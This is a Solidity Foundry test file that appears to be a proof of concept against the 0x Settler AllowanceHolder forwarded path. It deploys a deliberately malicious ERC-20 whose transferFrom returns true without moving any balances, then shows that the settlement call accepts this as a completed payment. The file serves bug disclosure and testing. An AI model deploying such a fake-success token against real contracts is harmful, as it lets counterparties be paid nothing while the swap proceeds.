// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC20} from "@forge-std/interfaces/IERC20.sol";
import {ISignatureTransfer} from "@permit2/interfaces/ISignatureTransfer.sol";
import {ISettlerBase} from "src/interfaces/ISettlerBase.sol";

import {SettlerBasePairTest} from "./SettlerBasePairTest.t.sol";
import {ICurveV2Pool} from "./vendor/ICurveV2Pool.sol";
import {IZeroEx} from "./vendor/IZeroEx.sol";

import {LibBytes} from "../utils/LibBytes.sol";
import {ActionDataBuilder} from "../utils/ActionDataBuilder.sol";

import {SafeTransferLib} from "src/vendor/SafeTransferLib.sol";

import {IAllowanceHolder} from "src/allowanceholder/IAllowanceHolder.sol";
import {Settler} from "src/Settler.sol";
import {ISettlerActions} from "src/ISettlerActions.sol";
import {RfqOrderSettlement} from "src/core/RfqOrderSettlement.sol";

import {console2} from "@forge-std/Test.sol";

abstract contract AllowanceHolderPairTest2 is SettlerBasePairTest {
    using SafeTransferLib for IERC20;
    using LibBytes for bytes;

    function setUp() public virtual override {
        super.setUp();
        // Trusted Forwarder / Allowance Holder
        safeApproveIfBelow(fromToken(), FROM, address(allowanceHolder), amount());
    }

    function uniswapV3Path() internal virtual returns (bytes memory);
    function uniswapV2Pool() internal virtual returns (address);

    /* Copy the pattern in testAllowanceHolder_uniswapV3 
    (it builds a single TRANSFER_FROM action first), strip the swap, 
    and point permit.permitted.token at a malicious ERC-20 that “returns success” but doesn’t move balances. 
    This shows the forwarded path accepting a vacuous success transfer.
    */
    function testAllowanceHolder_vacuousPay_MaliciousToken() public {
        // 1) Deploy a malicious/non-conforming ERC20 that lies about transferFrom
        FakeOKButDoesNothingERC20 fake = new FakeOKButDoesNothingERC20();

        // 2) Give FROM a healthy balance (to look realistic in traces)
        uint256 amt = amount();
        fake.mint(FROM, amt);

        // Sanity: FROM really “has” amt (per the token’s own view)
        assertEq(fake.balanceOf(FROM), amt, "pre: FROM balance");
        console2.log("amt", amt);

        // 3) Build the exact same AllowanceHolder TRANSFER_FROM action other test uses,
        //    but set token = address(fake) and empty sig (forwarded path).
        bytes[] memory actions = ActionDataBuilder.build(
            abi.encodeCall(
                ISettlerActions.TRANSFER_FROM,
                (
                    address(settler),
                    // permit.permitted.token = fake; amount = amt; nonce = 0
                    defaultERC20PermitTransfer(address(fake), amt, 0),
                    new bytes(0) // sig is ignored on forwarded path
                )
            )
        );
        // no follow-up actions on purpose — we only want to observe the “payment” step
        console2.log("actions.length", actions.length);

        // 4) Execute via AllowanceHolder (forwarded), like in other tests
        bytes memory call = abi.encodeCall(
            settler.execute,
            (
                ISettlerBase.AllowedSlippage({
                    recipient: payable(address(0)),
                    buyToken: IERC20(address(0)),
                    minAmountOut: 0
                }),
                actions,
                bytes32(0)
            )
        );
        console2.log("call.length", call.length);

        IAllowanceHolder _allowanceHolder = allowanceHolder;
        Settler _settler = settler;

        vm.startPrank(FROM, FROM); // taker is the caller in forwarded flows
        snapStartName("allowanceHolder_vacuous_pay_malicious_token");

        // 5) The call MUST NOT revert — this is the bug: AllowanceHolder treats the transfer
        //    as success even though no balances change.

        // PRIME EPHEMERAL ALLOWANCE FOR (operator=settler, owner=FROM, token=fake)
        _allowanceHolder.exec(
            address(_settler), // operator that will call transferFrom (msg.sender inside AH.transferFrom)
            address(fake), // token whose transferFrom will be attempted
            amt, // allowance to set for this forwarded call
            payable(address(_settler)), // target to forward to (Settler)
            call // calldata for Settler.execute(...)
        );

        snapEnd();
        vm.stopPrank();

        // 6) Assert *no tokens actually moved*
        assertEq(fake.balanceOf(FROM), amt, "post: FROM should be unchanged");
        assertEq(fake.balanceOf(address(_settler)), 0, "post: Settler should be unchanged");
        console2.log("address(_settler)", address(_settler));
    }
}

/// @dev Minimal malicious token: returns true on transferFrom, but does nothing.
contract FakeOKButDoesNothingERC20 {
    string public name = "Fake OK But Does Nothing";
    string public symbol = "FAKE";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        console2.log("mint", to, amt);
    }

    // Always “approve” and “allow” to keep integrations happy (not strictly needed here)
    function allowance(address, address) external pure returns (uint256) {
        console2.log("allowance called");
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        console2.log("approve called");
        return true;
    }

    // The core lie: report success, do not change balances or allowances.
    function transferFrom(address from, address to, uint256 amount) external pure returns (bool) {
        //console2.log("transferFrom called");
        console2.log(" from", from);
        console2.log(" to", to);
        console2.log(" amount", amount);
        return true;
    }
}
